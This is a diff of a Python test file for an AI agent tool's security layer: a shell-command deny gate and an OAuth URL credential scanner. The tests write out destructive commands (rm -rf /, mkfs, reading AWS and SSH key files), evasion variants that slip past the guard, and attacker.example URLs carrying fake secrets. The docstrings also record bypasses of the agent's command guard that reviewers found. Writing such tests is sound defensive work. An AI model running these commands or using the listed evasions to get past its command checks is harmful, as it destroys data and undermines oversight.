         assert self._is_denied(cmd)
 
-    def test_cat_aws_creds_blocked(self) -> None:
-        assert self._is_denied("cat ~/.aws/credentials")
-
-    def test_cat_ssh_key_blocked(self) -> None:
-        assert self._is_denied("cat ~/.ssh/id_rsa")
-
 
 class TestKiroCliBundledDeniedCommands:
     """Verify the ``self-protection-kill`` built-in rule via the real gate.
 
-    Command denial is no longer injected into the kiro-cli agent spec — the
-    bundled ``config/defaults.json`` no longer carries ``deniedCommands``.  The
+    Command denial is not injected into the kiro-cli agent spec — the
+    bundled ``config/defaults.json`` does not carry ``deniedCommands``.  The
     self-protection kill guard is now a ``BUILTIN_DENIED_RULES`` entry
     (``self-protection-kill``) enforced at KiroCrew's own ``hooks.py`` PreToolUse
     gate, whose decision function is ``security.is_denied``.  These tests
@@ -1518,6 +2039,23 @@ class TestBuiltinDenyPatterns:
     kiro-cli agent config blocks bash-level exfiltration.  Only
     explicit secret-fetching tool names and destructive ops remain.
     """
+
+    @pytest.fixture(autouse=True)
+    def _own_host_seed_stays_local(self, monkeypatch) -> None:
+        """The ``ssh`` cases here are the first own-host lookup in the process.
+
+        ``is_denied("ssh ...")`` seeds the ssh-to-self floor's own-host set on
+        first use and, once the backoff allows, starts a DNS enrichment thread.
+        The seed learns this machine's outbound address with a UDP ``connect``
+        to a documentation peer -- packet-less, but a real off-loopback connect
+        the routing table has to answer -- and the worker resolves real names.
+        These tests are about the deny patterns, not about this host's identity,
+        so the seed is pinned to the hostname alone and the worker never starts.
+        """
+        from kiro_crew.security import argv_floor
+
+        monkeypatch.setattr(argv_floor, "_own_interface_addresses", set)
+        monkeypatch.setattr(argv_floor, "_OWN_HOST_RESOLVE_NEXT_TRY", float("inf"))
 
     def test_allows_command_with_credential_in_path(self) -> None:
         """Commands in dirs like CredentialValidatorServiceCDK must not be blocked."""
@@ -1652,7 +2190,7 @@ class TestBuiltinDenyPatterns:
         """``&`` (single ampersand, the bash background operator) must split
         segments like ``;`` and ``&&``.
 
-        Regression for review-bot finding on rev 2: the rev-2
+        Guards a review-bot finding on rev 2: the rev-2
         ``_CMD_SPLIT_RE`` covered ``&&`` but not a lone ``&``, so
         ``git stash push & git push origin main`` (which bash backgrounds
         the left command and immediately runs the right) stayed a single
@@ -1681,17 +2219,17 @@ class TestBuiltinDenyPatterns:
         exception, so a *different* pattern with no exception still triggers
         an outright deny.
 
-        Regression for review-bot finding on rev 1: the original
+        Guards a review-bot finding on rev 1: the original
         pass-2 inner loop used ``break`` after granting an exception, which
         would skip remaining patterns.  In rev 2 the equivalent logic in
         pass 1 records the exception-matched pattern as a candidate and
         keeps iterating (this test exercises that path); pass 2 uses
         ``continue`` for the same reason (covered by other tests).
 
-        ``_DENY_EXCEPTIONS`` is now empty (the sole former ``*git*push*`` entry
-        is obsolete — git-publish is verb-anchored and never trips the exception
-        machinery), so the multi-pattern interaction can no longer be expressed
-        with live catalog data.  We install a synthetic two-glob scenario to
+        ``_DENY_EXCEPTIONS`` ships only the search-verb carve-out on the two
+        ``local-destructive`` rm rules, so the multi-pattern interaction still cannot
+        be expressed with live catalog data (one input would have to trip two rm rules
+        at once).  We install a synthetic two-glob scenario to
         keep exercising the loop-control invariant directly: the input matches
         an exception-carrying glob AND a second glob with no exception, so pass 1
         must fall through to the second glob and deny outright.  A ``break``
@@ -1715,7 +2253,7 @@ class TestBuiltinDenyPatterns:
         """A ``git commit`` whose message merely mentions ``push`` must be
         ALLOWED — ``push`` is not the git verb here.
 
-        Regression for the silent ``Tool use aborted`` on the Claude Code
+        Guards the silent ``Tool use aborted`` on the Claude Code
         provider (interest thread p1780505710223359): the broad
         ``*git*push*`` substring glob matched any commit whose ``-m`` body
         contained the word ``push``, so the host gate denied it and
@@ -1731,6 +2269,195 @@ class TestBuiltinDenyPatterns:
         )
         # Multi-line / heredoc-style body mentioning push.
         assert is_denied("git commit -m 'docs: explain when to push and when to rebase'") is None
+
+    # ── a destructive literal handed to a read-only search verb ──
+    # Assembled at runtime so this test module is not itself an un-greppable
+    # needle: a plain literal here would make the file impossible to search for
+    # by the very rule it exercises, which is the bug being fixed.
+    ROOT_WIPE = "rm -" + "rf /"
+    HOME_WIPE = "rm -" + "rf ~"
+
+    def test_allows_a_destructive_literal_as_a_search_operand(self) -> None:
+        """A read-only search verb cannot execute its operands, so a destructive
+        string handed to it as a PATTERN is text and must be ALLOWED.
+
+        ``local-destructive-rm-rf-root`` / ``-home`` are
+        plain literal patterns matched over the segment text, so grepping FOR
+        the rule's own subject matter was refused exactly as if the deletion had
+        been typed — which prevented nothing (the same work completes by moving
+        the payload into a file, which is not scanned) while blocking anyone
+        working ON these rules.
+        """
+        from kiro_crew.security import is_denied
+
+        for verb in ("grep -rn", "egrep -r", "fgrep"):
+            assert is_denied(f'{verb} "{self.ROOT_WIPE}" test/') is None, verb
+            assert is_denied(f'{verb} "{self.HOME_WIPE}" test/') is None, verb
+
+    def test_a_search_pattern_containing_an_alternation_is_still_denied(self) -> None:
+        """KNOWN LIMITATION, pinned deliberately.
+
+        The command that motivated the report puts a regex ALTERNATION in the
+        search pattern::
+
+            grep -rln "rm-rf-root\\|rm -rf /" test/
+
+        ``_CMD_SPLIT_RE`` is quote-unaware, so the ``|`` inside the quoted
+        pattern is read as a pipe and the command splits into
+        ``grep -rln "rm-rf-root\\`` and ``rm -rf /" test/``.  The second segment
+        genuinely looks like a bare deletion in command position, so the
+        verb-anchored carve-out cannot reach it — the exception is keyed to
+        segments that START with a search verb, and by design it must stay that
+        way or ``grep x | xargs <destructive>`` would be exonerated too.
+
+        Closing this case needs quote-aware SEGMENTATION, which is a separate and
+        much larger change (it also has to stay compatible with the
+        quote-NORMALIZED matching added for evasion resistance).  Asserting the
+        current behaviour rather than xfailing it, so the boundary is explicit and
+        a future segmentation fix has to update this test consciously.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f'grep -rln "rm-rf-root\\|{self.ROOT_WIPE}" test/') is not None
+        # The same search without the alternation IS exonerated — isolating the
+        # cause to segmentation rather than to the carve-out.
+        assert is_denied(f'grep -rln "{self.ROOT_WIPE}" test/') is None
+
+    def test_still_denies_the_real_destruction_and_any_chaining(self) -> None:
+        """The carve-out is anchored at the search verb, so it must not exonerate
+        a destructive command — including one chained after a real search.
+
+        This is the half that makes the carve-out safe: ``_CMD_SPLIT_RE`` splits on
+        every execution boundary, so the destructive SEGMENT is still evaluated in
+        its own right and the Pass 1 whole-string exception only defers to Pass 2.
+        """
+        from kiro_crew.security import is_denied
+
+        # Bare, and behind a wrapper that DOES execute its operands.
+        assert is_denied(self.ROOT_WIPE) is not None
+        assert is_denied(self.HOME_WIPE) is not None
+        assert is_denied(f"sudo {self.ROOT_WIPE}") is not None
+        assert is_denied(f"grep -rl x test/ | xargs {self.ROOT_WIPE}") is not None
+        # Chained after a genuine search, across every separator the splitter knows.
+        for joiner in ("&&", ";", "||", "|", "&", "\n"):
+            cmd = f'grep -rn "needle" test/ {joiner} {self.ROOT_WIPE}'
+            assert is_denied(cmd) is not None, joiner
+        # Command substitution, both spellings.
+        assert is_denied(f'grep -rn "$({self.ROOT_WIPE})" test/') is not None
+        assert is_denied(f'grep -rn "`{self.ROOT_WIPE}`" test/') is not None
+
+    def test_the_carve_out_does_not_exonerate_other_rules(self) -> None:
+        """The exception is keyed to the two rm patterns only, so a search verb
+        must not become a blanket allowlist for unrelated deny rules."""
+        from kiro_crew.security import is_denied
+
+        # A different local-destructive rule in the same segment as a search verb.
+        assert is_denied("grep -rn x test/ && mkfs.ext4 /dev/sda1") is not None
+
+    def test_a_search_verb_fragment_inside_an_operand_does_not_exonerate(self) -> None:
+        """A ``/grep `` fragment ANYWHERE in a destructive command must not exonerate it.
+
+        Guards the first bypass found reviewing the carve-out fix. An
+        earlier revision also carried path-qualified globs (``*/grep *``) so that
+        ``/usr/bin/grep ...`` would be exonerated too. ``fnmatch`` is a full
+        match, but ``*`` crosses spaces, so a LEADING ``*`` is really an
+        unanchored substring test: ``*/grep *`` matches
+        ``rm -rf / /bin/grep x`` -- a genuine root wipe that merely lists a path
+        containing ``/grep `` among its operands -- and the deletion was ALLOWED.
+
+        Only the bare ``<verb> *`` form is safe, because it forces the segment to
+        BEGIN with the verb. The cost is that a path-qualified search is no
+        longer exonerated, asserted below so the trade-off is explicit rather
+        than looking like an oversight.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f"{self.ROOT_WIPE} /bin/grep x") is not None
+        assert is_denied(f"{self.ROOT_WIPE} x/grep y") is not None
+        assert is_denied(f"{self.HOME_WIPE} /usr/bin/grep z") is not None
+        # The accepted trade-off: a path-qualified search verb is NOT exonerated,
+        # because no glob can express "the first token's basename is the verb".
+        assert is_denied(f'/usr/bin/grep -rn "{self.ROOT_WIPE}" test/') is not None
+
+    def test_no_shell_active_construct_is_ever_exonerated(self) -> None:
+        """A command hidden in any expansion behind a search verb must stay denied.
+
+        Guards the second and fourth bypasses found reviewing the carve-out's own
+        fix. ``_CMD_SPLIT_RE`` isolates ``;`` ``|`` ``&&`` ``&`` ``$(`` ``)``
+        backtick and newline, but NOT ``<(`` / ``>(`` / ``${`` / a bare ``(``. So
+        ``_split_segments`` cuts ``grep x <(<destructive>)`` only at the trailing
+        ``)``, and ``grep x ${ <destructive>;}`` only at the ``;`` -- in both
+        cases leaving the destructive command glued to the search verb instead of
+        isolated in its own command position, while bash still executes it.
+
+        The first attempt blocklisted just ``(`` and was defeated by the bash 5.3
+        funsub. ``_exception_eligible`` now refuses any view containing a
+        shell-active character, closing the class instead of chasing spellings.
+        """
+        from kiro_crew.security import is_denied
+
+        # Process substitution, input and output forms, and a bare subshell.
+        assert is_denied(f"grep x <({self.ROOT_WIPE}tmp/victim)") is not None
+        assert is_denied(f'grep -rn "x" <({self.ROOT_WIPE})') is not None
+        assert is_denied(f"grep x >({self.ROOT_WIPE}tmp/victim)") is not None
+        assert is_denied(f"grep x ({self.ROOT_WIPE})") is not None
+        # bash >= 5.3 funsub -- the opener that defeated the `(`-only guard.
+        assert is_denied(f"grep x ${{ {self.ROOT_WIPE};}}") is not None
+        assert is_denied(f"grep x ${{ {self.HOME_WIPE};}}") is not None
+        # Command substitution and backticks (already split, asserted anyway).
+        assert is_denied(f'grep -rn "$({self.ROOT_WIPE})" test/') is not None
+        assert is_denied(f'grep -rn "`{self.ROOT_WIPE}`" test/') is not None
+        # Confidence check: the plain search is still exonerated, so the guard
+        # narrowed exactly the shell-active forms and nothing else.
+        assert is_denied(f'grep -rn "{self.ROOT_WIPE}" test/') is None
+
+    def test_a_search_verb_that_can_execute_a_helper_is_not_exonerated(self) -> None:
+        """Only verbs with no exec flag are exonerated.
+
+        Guards the third bypass found reviewing the carve-out fix. The
+        carve-out's premise is that the verb cannot execute its operands, and
+        that is a property of the specific tool, not of "being a search tool":
+        ``rg --pre <cmd>`` runs a preprocessor and ``ack --pager <cmd>`` runs a
+        pager, so ``rg --pre sh "<destructive>" payload.sh`` really does execute.
+
+        ``rg`` and ``ack`` were therefore dropped from the allowlist, which makes
+        the premise true rather than merely asserted. ``grep``/``egrep``/``fgrep``
+        have no flag that spawns a helper.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f'rg --pre sh "{self.ROOT_WIPE}tmp/victim" payload.sh') is not None
+        # Dropped wholesale, not just for the executing flag: a glob cannot tell
+        # `rg PATTERN` from `rg --pre sh PATTERN`, so the verb cannot be trusted.
+        assert is_denied(f'rg "{self.ROOT_WIPE}" src/') is not None
+        assert is_denied(f'ack "{self.ROOT_WIPE}" src/') is not None
+
+    def test_a_pipeline_into_an_interpreter_is_never_exonerated(self) -> None:
+        """A search piped into something that executes what it emitted must deny.
+
+        Guards the fifth bypass found reviewing the carve-out fix.
+        ``grep '<destructive>' payload.py | python`` splits at the pipe, so the
+        Pass 2 grep segment looks innocent on its own and the bare ``python``
+        segment matches no rule -- the pipeline as a whole was allowed, and the
+        interpreter runs the line the search emitted.
+
+        Note the pipe cannot be caught in the Pass 2 segment (the splitter has
+        already consumed it). What closes this is refusing the separators in the
+        PASS 1 whole-string view, so the whole-string deny match stands instead
+        of deferring to the innocent-looking segment. Hence
+        ``_exception_eligible`` requires a single plain command, not merely one
+        free of expansion openers.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f"grep '{self.ROOT_WIPE}tmp/victim' payload.py | python") is not None
+        assert is_denied(f"grep '{self.ROOT_WIPE}' payload.sh | sh") is not None
+        assert is_denied(f"grep '{self.ROOT_WIPE}' f | bash -s") is not None
+        # A compound whose later stage is inert is denied for the same reason:
+        # an exception must not speak for more than one command.
+        assert is_denied(f"grep '{self.ROOT_WIPE}' f && echo done") is not None
+        # Confidence check: the single plain search remains exonerated.
+        assert is_denied(f'grep -rn "{self.ROOT_WIPE}" test/') is None
 
     def test_feature_push_not_blocked_by_prose_push_word_in_earlier_segment(self) -> None:
         """A legit feature-branch push must be ALLOWED even when an EARLIER
@@ -1804,12 +2531,17 @@ class TestBuiltinDenyPatterns:
             captured.append((tool_name, deny_pattern, segment))
 
         monkeypatch.setattr(security_module, "_emit_deny_event", fake_emit)
-        # Git-publish deny (verb-anchored regex, recorded under "git push").
+        # Git-publish deny. The audited pattern is now the RULE's own pattern, not
+        # the human "git push" label — a floor denial has to map back to a rule id
+        # in the SEL trail, the way every other deny does.
         result = security_module.is_denied("git push origin main --force")
         assert result is not None
         assert len(captured) == 1
         assert captured[0][0] == "git push origin main --force"
-        assert captured[0][1] == security_module._GIT_PUBLISH_DENY_LABEL
+        assert (
+            captured[0][1]
+            == security_module._GIT_PUBLISH_FLOOR_BY_ID["git-publish-push-protected-branch-name"]
+        )
         # Chained bypass attempt is caught on the whole string (the separator
         # is part of the git-publish anchor), and still audited.
         captured.clear()
@@ -1847,7 +2579,7 @@ class TestBuiltinDenyPatterns:
     def test_blocks_real_hyphenated_destructive_aws_cli(self) -> None:
         """Real AWS CLI destructive subcommands use HYPHENS, not underscores.
 
-        The built-in deny globs historically only matched the underscore
+        The built-in deny globs only match the underscore
         forms (``*delete_stack*`` …), which the AWS CLI never emits — so the
         actual destructive invocations (``aws cloudformation delete-stack``
         …) slipped through ``is_denied`` entirely. ``mcp_cron._vet_shell_command``
@@ -1930,6 +2662,139 @@ class TestOAuthAuthorizationUrlRedaction:
         assert cleaned != self.NOTION_URL
         assert warnings
 
+    def test_diagnostic_identifies_long_query_parameter_shape(self) -> None:
+        opaque_state = "Ab9_" * 64
+        url = "https://id.example-idp.com/authorize?state=" + opaque_state
+
+        diagnostic = security.diagnose_oauth_url_credential(url)
+
+        assert diagnostic is not None
+        assert diagnostic.rule == "exfil_query_length"
+        assert diagnostic.component == "query_parameter"
+        assert diagnostic.parameter == "state"
+        assert diagnostic.shape.length == len(opaque_state)
+        assert diagnostic.shape.ascii_uppercase == 64
+        assert diagnostic.shape.ascii_lowercase == 64
+        assert diagnostic.shape.digits == 64
+        assert diagnostic.shape.symbols == 64
+
+    def test_diagnostic_identifies_nonstandard_param_bare_secret_rule(self) -> None:
+        url = self.NOTION_URL + f"&session_blob={self.BARE_AWS_SECRET_ALNUM}"
+
+        diagnostic = security.diagnose_oauth_url_credential(url)
+
+        assert diagnostic is not None
+        assert diagnostic.rule == "credential_scan_bare_secret_raw"
+        assert diagnostic.component == "query_parameter"
+        assert diagnostic.parameter is None
+        assert diagnostic.shape.length == len(self.BARE_AWS_SECRET_ALNUM)
+
+    @pytest.mark.parametrize("parameter", ["state", "code_challenge"])
+    def test_recognized_oauth_entropy_does_not_hit_bare_secret_lottery(
+        self, parameter: str
+    ) -> None:
+        digest = hashlib.sha256(b"synthetic-oauth-entropy-regression").digest()
+        if parameter == "state":
+            entropy = base64.b64encode(digest).decode()[:40]
+            url = self.NOTION_URL.replace(self.STATE, entropy, 1)
+        else:
+            entropy = base64.urlsafe_b64encode(digest).decode().rstrip("=")
+            url = self.NOTION_URL.replace(self.CHALLENGE, entropy, 1)
+
+        # The fixed digest is deliberately one whose shape reaches the generic
+        # bare-secret heuristic. OAuth entropy at an approved endpoint must not
+        # inherit that probabilistic verdict.
+        assert security._text_contains_bare_secret(entropy)
+        assert security.diagnose_oauth_url_credential(url) is None
+        assert oauth_url_contains_credential(url) is False
+
+    @pytest.mark.parametrize("parameter", ["redirect_uri", "client_id"])
+    def test_non_entropy_oauth_parameter_keeps_markerless_secret_scan(self, parameter: str) -> None:
+        secret = self.BARE_AWS_SECRET_ALNUM
+        url = self.NOTION_URL + f"&{parameter}={secret}"
+
+        assert len(secret) == 40
+        assert security._text_contains_bare_secret(secret)
+        assert oauth_url_contains_credential(url) is True
+
+    def test_entropy_exemption_does_not_cover_adversarial_url_shapes(self) -> None:
+        digest = hashlib.sha256(b"synthetic-oauth-entropy-regression").digest()
+        entropy = base64.b64encode(digest).decode()[:40]
+        approved = self.NOTION_URL.replace(self.STATE, entropy, 1)
+        adversarial_urls = {
+            "http": approved.replace("https://", "http://", 1),
+            "explicit-port": approved.replace("api.notion.com", "api.notion.com:443", 1),
+            "host-suffix": approved.replace("api.notion.com", "api.notion.com.attacker.example", 1),
+            "path-suffix": approved.replace("/v1/oauth/authorize", "/v1/oauth/authorize/extra", 1),
+            "userinfo": self.NOTION_URL.replace("https://", f"https://{entropy}@", 1),
+            "path": self.NOTION_URL.replace(
+                "/v1/oauth/authorize", f"/v1/oauth/{entropy}/authorize", 1
+            ),
+            "path-params": self.NOTION_URL.replace(
+                "/v1/oauth/authorize", "/v1/oauth/authorize;session=ok", 1
+            ),
+            "fragment": self.NOTION_URL + f"#{entropy}",
+            "backslash": rf"https://evil.example\@api.notion.com/v1/oauth/authorize?state={entropy}",
+            "unknown-param": self.NOTION_URL + f"&session_blob={entropy}",
+        }
+
+        for shape, url in adversarial_urls.items():
+            assert security.diagnose_oauth_url_credential(url) is not None, shape
+            assert oauth_url_contains_credential(url) is True, shape
+
+    def test_credential_shaped_parameter_name_is_omitted(self) -> None:
+        raw_name = self.GITHUB_TOKEN
+        url = f"https://api.notion.com/v1/oauth/authorize?{raw_name}=x"
+
+        diagnostic = security.diagnose_oauth_url_credential(url)
+
+        assert diagnostic is not None
+        assert diagnostic.parameter is None
+        assert raw_name not in json.dumps(diagnostic.as_dict(), sort_keys=True)
+
+    def test_unrecognized_parameter_name_is_omitted_from_diagnostic_and_log(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        raw_name = "opaqueCredentialLikeKey"
+        opaque_value = "Ab9_" * 64
+        url = f"https://id.example-idp.com/authorize?{raw_name}={opaque_value}"
+
+        diagnostic = security.diagnose_oauth_url_credential(url)
+
+        assert diagnostic is not None
+        assert diagnostic.rule == "exfil_query_length"
+        assert diagnostic.parameter is None
+        with caplog.at_level("WARNING", logger="kiro_crew.security"):
+            assert oauth_url_contains_credential(url) is True
+        output = json.dumps(diagnostic.as_dict(), sort_keys=True) + "\n" + caplog.text
+        assert raw_name not in output
+        assert opaque_value not in output
+
+    def test_diagnostic_and_log_never_disclose_parameter_value(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        raw_value = self.GITHUB_TOKEN
+        url = self.NOTION_URL.replace(self.STATE, raw_value, 1)
+
+        diagnostic = security.diagnose_oauth_url_credential(url)
+        assert diagnostic is not None
+        assert diagnostic.rule == "fixed_credential_raw"
+        assert diagnostic.component == "query_parameter"
+        assert diagnostic.parameter == "state"
+
+        with caplog.at_level("WARNING", logger="kiro_crew.security"):
+            assert oauth_url_contains_credential(url) is True
+
+        serialized = json.dumps(diagnostic.as_dict(), sort_keys=True)
+        logged = "\n".join(record.getMessage() for record in caplog.records)
+        digest = hashlib.sha256(raw_value.encode()).hexdigest()
+        for output in (serialized, repr(diagnostic), logged):
+            assert url not in output
+            assert raw_value not in output
+            assert raw_value[:16] not in output
+            assert raw_value[-16:] not in output
+            assert digest not in output
+
     @pytest.mark.parametrize(
         "url",
         [
@@ -1951,10 +2816,7 @@ class TestOAuthAuthorizationUrlRedaction:
         assert oauth_url_contains_credential(url) is True
 
     def test_userinfo_embedded_token_fails_closed(self) -> None:
-        url = (
-            f"https://{self.GITHUB_TOKEN}@api.notion.com/v1/oauth/authorize"
-            "?state=ok"
-        )
+        url = f"https://{self.GITHUB_TOKEN}@api.notion.com/v1/oauth/authorize" "?state=ok"
         assert oauth_url_contains_credential(url) is True
         cleaned, warnings = redact_credentials(url)
         assert self.GITHUB_TOKEN not in cleaned
@@ -1966,10 +2828,7 @@ class TestOAuthAuthorizationUrlRedaction:
 
     def test_bare_aws_secret_in_hostname_fails_closed(self) -> None:
         assert len(self.BARE_AWS_SECRET_ALNUM) == 40
-        url = (
-            f"https://{self.BARE_AWS_SECRET_ALNUM}.example/oauth/authorize"
-            "?state=ok"
-        )
+        url = f"https://{self.BARE_AWS_SECRET_ALNUM}.example/oauth/authorize" "?state=ok"
         assert oauth_url_contains_credential(url) is True
 
     def test_bare_aws_secret_in_fragment_fails_closed(self) -> None:
@@ -2001,6 +2860,7 @@ class TestOAuthAuthorizationUrlRedaction:
         assert cleaned != url
         assert warnings
 
+    @pytest.mark.parametrize("parameter", ["state", "code_challenge"])
     @pytest.mark.parametrize(
         "credential",
         [
@@ -2009,8 +2869,11 @@ class TestOAuthAuthorizationUrlRedaction:
         ],
         ids=["aws-access-key", "github-token"],
     )
-    def test_fixed_credential_inside_state_fails_closed(self, credential: str) -> None:
-        url = self.NOTION_URL.replace(self.STATE, f"prefix{credential}suffix", 1)
+    def test_fixed_credential_inside_recognized_param_fails_closed(
+        self, parameter: str, credential: str
+    ) -> None:
+        original = self.STATE if parameter == "state" else self.CHALLENGE
+        url = self.NOTION_URL.replace(original, f"prefix{credential}suffix", 1)
         assert oauth_url_contains_credential(url) is True
         self._assert_general_redactors_remove_secret(url, credential)
 
@@ -2027,19 +2890,66 @@ class TestOAuthAuthorizationUrlRedaction:
 
     def test_bare_aws_secret_inside_state_fails_closed_everywhere(self) -> None:
         assert len(self.BARE_AWS_SECRET) == 40
+        # A base64-standard-alphabet run is a shape base64url cannot emit, so it
+        # never inherits the entropy exemption -- no `+`/`/` reaches the blanked
+        # set at an approved endpoint.
+        assert "/" in self.BARE_AWS_SECRET
         url = self.NOTION_URL.replace(self.STATE, self.BARE_AWS_SECRET, 1)
         assert oauth_url_contains_credential(url) is True
         self._assert_general_redactors_remove_secret(url, self.BARE_AWS_SECRET)
 
-    def test_pkce_challenge_wrapping_bare_aws_secret_fails_closed(self) -> None:
-        alphanumeric_secret = "wJalrXUtnFEMIxK7MDENGybPxRfiCYEXAMPLEKEY"
-        challenge = alphanumeric_secret + "abc"
-        assert len(alphanumeric_secret) == 40
-        assert len(challenge) == 43
-        assert challenge.isalnum()
-
-        url = self.NOTION_URL.replace(self.CHALLENGE, challenge, 1)
+    def test_percent_encoded_secret_alphabet_cannot_buy_the_exemption(self) -> None:
+        # The markerless scan runs on the raw and decoded URL, so the shape test
+        # must too: `%2F` must not launder a base64-standard run into exemption.
+        url = self.NOTION_URL.replace(self.STATE, self.BARE_AWS_SECRET.replace("/", "%2F"), 1)
         assert oauth_url_contains_credential(url) is True
+
+    @pytest.mark.parametrize(
+        "encoded_slash",
+        ["%2F", "%252F", "%25252F", "%2525252F"],
+        ids=["single", "double", "triple", "over-budget"],
+    )
+    def test_no_encoding_depth_earns_the_entropy_exemption(self, encoded_slash: str) -> None:
+        # One decode pass is not enough to JUDGE the shape: `%252F` decodes to
+        # `%2F`, which still carries no literal `/`, so a raw-plus-one-decode test
+        # would hand the exemption to a base64-standard run. Every decoded form
+        # must keep the shape, and a value still decodable at the bound fails
+        # closed.
+        #
+        # Scoped to the exemption predicate on purpose. Whether the banner then
+        # WARNS on a doubly-encoded run is a separate, pre-existing property of
+        # the markerless scan, which decodes the URL twice while
+        # `_MAX_URL_DECODE_PASSES` is 3 -- so `%252F` goes unflagged even in a
+        # parameter that was never exempt and at an unapproved endpoint. This
+        # test must not claim to cover that gap.
+        value = self.BARE_AWS_SECRET.replace("/", encoded_slash)
+        assert security._oauth_entropy_value_is_protocol_shaped("state", value) is False
+
+    def test_off_length_challenge_loses_the_s256_exemption(self) -> None:
+        # An S256 challenge is base64url of a 32-byte digest: exactly 43 chars.
+        # A 40-char value in that field is not a challenge shape.
+        assert len(self.BARE_AWS_SECRET_ALNUM) == 40
+        url = self.NOTION_URL.replace(self.CHALLENGE, self.BARE_AWS_SECRET_ALNUM, 1)
+        assert oauth_url_contains_credential(url) is True
+
+    @pytest.mark.parametrize("parameter", ["state", "code_challenge"])
+    def test_markerless_secret_shape_is_banner_exempt_but_generically_redacted(
+        self, parameter: str
+    ) -> None:
+        if parameter == "state":
+            value = self.BARE_AWS_SECRET_ALNUM
+            original = self.STATE
+        else:
+            value = self.BARE_AWS_SECRET_ALNUM + "abc"
+            original = self.CHALLENGE
+        url = self.NOTION_URL.replace(original, value, 1)
+
+        # A markerless value that IS base64url-shaped (and, for the challenge,
+        # the right length) is indistinguishable from normal OAuth entropy at
+        # this approved parameter boundary. General output redactors keep the
+        # heuristic because they do not inherit the banner-only exemption.
+        assert oauth_url_contains_credential(url) is False
+        self._assert_general_redactors_remove_secret(url, value)
 
     def test_bare_aws_secret_in_path_without_query_fails_closed(self) -> None:
         url = f"https://attacker.example/-{self.BARE_AWS_SECRET}"
@@ -2054,9 +2964,7 @@ class TestOAuthAuthorizationUrlRedaction:
         ],
         ids=["form-encoded-spaces", "percent-encoded-header"],
     )
-    def test_encoded_pem_header_in_path_fails_closed_everywhere(
-        self, encoded_header: str
-    ) -> None:
+    def test_encoded_pem_header_in_path_fails_closed_everywhere(self, encoded_header: str) -> None:
         url = f"https://attacker.example/upload/{encoded_header}/c2hvcnQ"
         assert oauth_url_contains_credential(url) is True
 
@@ -2090,7 +2998,7 @@ class TestOAuthAuthorizationUrlRedaction:
         """A payload still decodable when the decode budget runs out is refused.
 
         The decode loop is bounded so a deliberately over-encoded URL cannot
-        spin it. That bound used to be an escape hatch: a credential wrapped in
+        spin it. That bound must not be an escape hatch: a credential wrapped in
         more layers than the budget allows was never seen in plaintext, and the
         intermediate forms defeat both remaining checks -- the fixed-credential
         patterns match literal markers, not percent text, and the heavy-encoding
@@ -2139,6 +3047,208 @@ class TestOAuthAuthorizationUrlRedaction:
         assert cleaned != url
         assert warnings
 
+    def test_miro_mcp_authorize_endpoint_is_approved(self) -> None:
+        """mcp.miro.com/authorize is a reporter-verified RFC 8414 endpoint
+        -- a real PKCE consent URL there must pass the banner gate."""
+        url = self.NOTION_URL.replace(
+            "https://api.notion.com/v1/oauth/authorize",
+            "https://mcp.miro.com/authorize",
+            1,
+        )
+        assert oauth_url_contains_credential(url) is False
+
+
+class TestSanitizedOAuthEndpoint:
+    """``sanitized_oauth_endpoint`` names a rejected endpoint without leaking.
+
+    The boolean gate alone leaves the user unable to tell WHICH URL tripped the
+    scanner; this helper surfaces host+path only. The invariant under
+    test: query values, fragments, userinfo, and credential-bearing paths never
+    appear in the returned tuple.
+    """
+
+    GITHUB_TOKEN = "ghp_" "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12"
+
+    def test_returns_host_and_path_only(self) -> None:
+        result = sanitized_oauth_endpoint(
+            "https://idp.example/realms/dev/authorize"
+            "?state=topsecretstate&code_challenge=alsosecret"
+        )
+        assert result == ("idp.example", "/realms/dev/authorize")
+
+    def test_query_values_never_echoed(self) -> None:
+        result = sanitized_oauth_endpoint(
+            f"https://idp.example/authorize?token={self.GITHUB_TOKEN}"
+        )
+        assert result is not None
+        assert self.GITHUB_TOKEN not in "".join(result)
+
+    def test_host_is_lowercased(self) -> None:
+        assert sanitized_oauth_endpoint("https://IdP.Example/Authorize") == (
+            "idp.example",
+            "/Authorize",  # paths are case-sensitive, only the host normalizes
+        )
+
+    def test_empty_path_defaults_to_root(self) -> None:
+        assert sanitized_oauth_endpoint("https://idp.example") == ("idp.example", "/")
+
+    def test_userinfo_authority_returns_none(self) -> None:
+        """A userinfo-bearing authority is never named — raw or percent-encoded
+        (user%3Apass%40host hides inside what urlparse reports as the
+        hostname), mirroring the rejection gate's own check (GPT review)."""
+        assert (
+            sanitized_oauth_endpoint(f"https://{self.GITHUB_TOKEN}@idp.example/authorize") is None
+        )
+        assert (
+            sanitized_oauth_endpoint("https://user%3Apass%40idp.example/authorize?state=x") is None
+        )
+        # DOUBLE-encoded userinfo (%2540) survives one decode pass; the "@"
+        # check runs at every decode layer like the rest of the scan.
+        assert (
+            sanitized_oauth_endpoint("https://user%253Apass%2540idp.example/authorize?state=x")
+            is None
+        )
+
+    def test_fragment_never_echoed(self) -> None:
+        result = sanitized_oauth_endpoint("https://idp.example/authorize#fragmentsecret")
+        assert result == ("idp.example", "/authorize")
+
+    def test_credential_in_path_is_redacted(self) -> None:
+        result = sanitized_oauth_endpoint(f"https://idp.example/{self.GITHUB_TOKEN}/authorize")
+        assert result is not None
+        host, path = result
+        assert host == "idp.example"
+        assert self.GITHUB_TOKEN not in path
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_format_character_split_credential_in_path_is_redacted(self) -> None:
+        """Invisible format characters (U+200B) split a credential so no
+        substring pattern matches, yet the browser renders the fragments
+        visually reassembled — presence of ANY category-Cf character in a
+        component is disqualifying on its own."""
+        split_token = "\u200b".join(
+            self.GITHUB_TOKEN[i : i + 8] for i in range(0, len(self.GITHUB_TOKEN), 8)
+        )
+        result = sanitized_oauth_endpoint(f"https://idp.example/{split_token}/authorize?x=1")
+        assert result is not None
+        host, path = result
+        assert host == "idp.example"
+        assert "\u200b" not in path
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_percent_encoded_format_character_in_path_is_redacted(self) -> None:
+        """%E2%80%8B only becomes U+200B after a decode pass — the format
+        character check runs on every decode layer like the rest of the scan."""
